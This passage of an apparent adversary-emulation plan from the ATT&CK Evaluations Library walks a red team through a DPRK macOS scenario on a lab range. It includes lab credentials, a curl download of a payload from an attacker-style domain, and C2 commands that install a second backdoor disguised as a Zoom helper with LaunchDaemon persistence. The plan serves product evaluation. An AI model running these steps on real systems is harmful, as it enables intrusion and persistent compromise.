<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-H74RC38PBM"></script>
    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-H74RC38PBM');</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/ael">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.787090901014">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.6.0">

    <!-- Primary Meta Tags -->
    <title>DPRK Scenario Overview</title>
    <meta name="title" content="DPRK Scenario Overview">
    <meta name="description" content="Legend of symbols:">

    <!-- Canonical -->
    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/dprk/emulation_plan/er6_dprk_scenario/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/dprk/emulation_plan/er6_dprk_scenario/">
    <meta property="og:title" content="DPRK Scenario Overview">
    <meta property="og:description" content="Legend of symbols:">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/dprk/emulation_plan/er6_dprk_scenario/">
    <meta property="twitter:title" content="DPRK Scenario Overview">
    <meta property="twitter:description" content="Legend of symbols:">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../favicon.png" rel="icon">
    <link href="../../../../resources/css/retype.css?v=3.6.0.787090901014" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.787090901014" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.787090901014" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.6.0.787090901014" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
                            </span>
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
                        </a>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <nav class="breadcrumb" aria-label="Breadcrumb">
                                    <ol role="list">
                                        <li class="pr-4">
                                            <a href="../../../../" class="pr-4">
                                                ATT&​CK Evaluations Library
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <span class="pr-4">
                                                Enterprise
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/dprk/" class="pr-4">
                                                DPRK
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/dprk/emulation_plan/" class="pr-4">
                                                DPRK Emulation Plans
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/dprk/emulation_plan/er6_dprk_scenario/" class="pr-4">
                                                DPRK Scenario Overview
                                            </a>
                                        </li>
                                    </ol>
                                </nav>
                
                                <!-- Page content  -->
<doc-anchor-target id="dprk-scenario-overview" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#dprk-scenario-overview">#</doc-anchor-trigger>
        <span>DPRK Scenario Overview</span>
    </h1>
</doc-anchor-target>
<p>Legend of symbols:</p>
<ul>
<li><span class="docs-emoji">&#x1F4A1;</span> - callout notes</li>
<li><span class="docs-emoji">&#x2757;</span> - extremely important note</li>
<li><span class="docs-emoji">&#x27A1;&#xFE0F;</span> - Switching to another session</li>
<li><span class="docs-emoji">&#x2B55;</span> - Disconnect from RDP</li>
<li><span class="docs-emoji">&#x1F534;</span> - Sign out of RDP</li>
<li><span class="docs-emoji">&#x1F4F7;</span> - take a screenshot</li>
<li><span class="docs-emoji">&#x1F551;</span> - Record timestamp</li>
</ul>
<hr>
<doc-anchor-target id="step-0---red-setup">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-0---red-setup">#</doc-anchor-trigger>
        <span>Step 0 - Red Setup</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="biohazard-procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Initiate an RDP session to the Kali attack host <code v-pre>corsair (223.246.0.70)</code>:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>IP</th>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>223.246.0.70</td>
<td>op1</td>
<td>Subpar-Parabola</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>In a new terminal window, start the evalsC2server, ensuring the following
handlers are enabled:</p>
<ul>
<li>FULLHOUSE.DOORED</li>
<li>STRATOFEAR</li>
<li>Simple File Server</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd DPRK/Resources/control_server
sudo go build -o controlServer main.go
sudo tar xvf handlers/stratofear/stratofear-certs.zip -C handlers/stratofear
sudo ./controlServer -c config/dprk.yml</code></pre>
</doc-codeblock></div>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>Subpar-Parabola</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Right-click within the terminal window and click &quot;Split Terminal
Horizontally&quot;. Within the new terminal, change directory to the location of the
evalsC2client.py and <strong>use this terminal for tasking implants</strong>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd DPRK/Resources/control_server</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Initiate an RDP session to the Windows jumpbox
<code v-pre>spitfire (223.246.0.90)</code></p>
</li>
</ul>
<doc-anchor-target id="step-0---range-setup">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-0---range-setup">#</doc-anchor-trigger>
        <span>Step 0 - Range Setup</span>
    </h2>
</doc-anchor-target>
<ul>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, initiate a VNC
session to the macOS victim workstation <code v-pre>hogshead (10.55.4.50)</code> as
<code v-pre>encryptpotter.net\ranrok</code>:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>VNC server</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>10.55.4.50::5900</td>
<td>test1234</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p>At the macOS login screen, authenticate with the following credentials:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>ranrok</td>
<td>Ladylike-Laugh</td>
</tr>
</tbody>
</table>
</div>
</li>
</ul>
</li>
<li><p>Open a Terminal and elevate to sudo, providing the following password when
prompted:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sudo su</code></pre>
</doc-codeblock></div>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ladylike-Laugh</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Execute the following command to download the initial payload.</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">curl -o /usr/local/bin/start.rb  http://b0ring-t3min4l.kr/files/start.rb</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="step-1---command-and-control">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---command-and-control">#</doc-anchor-trigger>
        <span>Step 1 - Command and Control</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<div class="flex mb-6">
    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
        <div class="flex items-center ml-4 h-7">
            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
                <g fill="currentColor"><g>
                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
                    <path fill="none" d="M0 0h24v24H0z"></path>
                </g></g>
            </svg>
        </div>
        <div class="pr-5 ml-3 w-full">
            <h5>Note</h5>
<p>This plan starts after initial compromise, where the victim was compromised
via supply chain attack resulting in execution of a malicious script in the
elevated context</p>
        </div>
    </div>
</div>
<p>A supply chain attack results in execution of a malicious Ruby script in the
elevated context. The Ruby script performs the following actions:</p>
<ul>
<li>Downloads two files:
<ul>
<li><code v-pre>/usr/local/bin/com.docker.sock</code> (FULLHOUSE.DOORED)</li>
<li><code v-pre>/usr/local/bin/com.docker.sock.lock</code> (FULLHOUSE.DOORED configuration file)</li>
</ul>
</li>
<li>Executes FULLHOUSE.DOORED</li>
</ul>
<p>FULLHOUSE.DOORED is a first-stage backdoor written in C++/Objective-C++. On
execution, it will load the configuration file then communicate over HTTP to
the C2 address defined in the configuration file (<code v-pre>http://199.88.44.44</code>).</p>
<doc-anchor-target id="biohazard-procedures-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-1">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>From the elevated Terminal, execute the Ruby script:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd /usr/local/bin/
ruby start.rb</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> On Kali, confirm C2 registration of FULLHOUSE.DOORED</p>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the new FULLHOUSE.DOORED session registration in the C2
server output.</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>start.rb downloads FULLHOUSE.DOORED components</td>
<td><a href="../../resources/payloads/start.rb">start.rb</a></td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FULLHOUSE.DOORED masquerades as Docker files</td>
<td><a href="../../resources/payloads/start.rb">start.rb</a></td>
<td>T1036.005 Masquerading: Match Legitimate Name or Location</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FULLHOUSE.DOORED communicates over HTTP</td>
<td><a href="../../resources/fullhouse.doored/src/comms.cpp">comms.cpp</a></td>
<td>T1071.001 Application Layer Protocol: Web Protocols</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-2---persistence">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---persistence">#</doc-anchor-trigger>
        <span>Step 2 - Persistence</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>Next, DPRK uses FULLHOUSE.DOORED to setup and install STRATOFEAR, the
second-stage backdoor.</p>
<p>DPRK uses FULLHOUSE.DOORED to download STRATOFEAR and its configuration file to
<code v-pre>hogshead (10.55.4.50)</code> as <code v-pre>/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool</code>
and <code v-pre>/Library/Fonts/pingfang.ttf.md5</code> respectively. Then, DPRK uses FULLHOUSE.DOORED
to create a LaunchDaemon for persistence and executes the LaunchDaemon to
execute STRATOFEAR.</p>
<p>On execution, STRATOFEAR loads its configuration file and communicates over
HTTPS to the C2 address defined in the configuration file
(<code v-pre>http://199.88.44.96</code>).</p>
<doc-anchor-target id="biohazard-procedures-2">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-2">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Task FULLHOUSE.DOORED to download STRATOFEAR to <code v-pre>hogshead (10.55.4.50)</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{&quot;id&quot;: 2, &quot;payload&quot;: &quot;stratofear&quot;, &quot;arg&quot;:&quot;/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Task FULLHOUSE.DOORED to download STRATOFEAR&#x27;s configuration file to
<code v-pre>hogshead (10.55.4.50)</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{&quot;id&quot;: 2, &quot;payload&quot;: &quot;pingfang.ttf.md5&quot;, &quot;arg&quot;:&quot;/Library/Fonts/pingfang.ttf.md5&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Task FULLHOUSE.DOORED to download and create STRATOFEAR&#x27;s LaunchDaemon:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{&quot;id&quot;: 2, &quot;payload&quot;: &quot;stratofear_launchd.plist&quot;, &quot;arg&quot;:&quot;/Library/LaunchDaemons/us.zoom.ZoomHelperTool.plist&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Task FULLHOUSE.DOORED to set STRATOFEAR as executable:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{&quot;id&quot;: 1, &quot;arg&quot;: &quot;chmod 0755 /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Task FULLHOUSE.DOORED to execute STRATOFEAR via launchctl:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{&quot;id&quot;: 1, &quot;arg&quot;: &quot;launchctl load -w /Library/LaunchDaemons/us.zoom.ZoomHelperTool.plist&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Confirm C2 registration of STRATOFEAR</p>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the registration of STRATOFEAR in the C2 server
output.</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation sub-steps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>FULLHOUSE.DOORED downloads STRATOFEAR and files</td>
<td><a href="../../resources/fullhouse.doored/src/core.hpp#L63">DownloadFile</a></td>
<td>T1105 Ingress Tool Transfer</td>
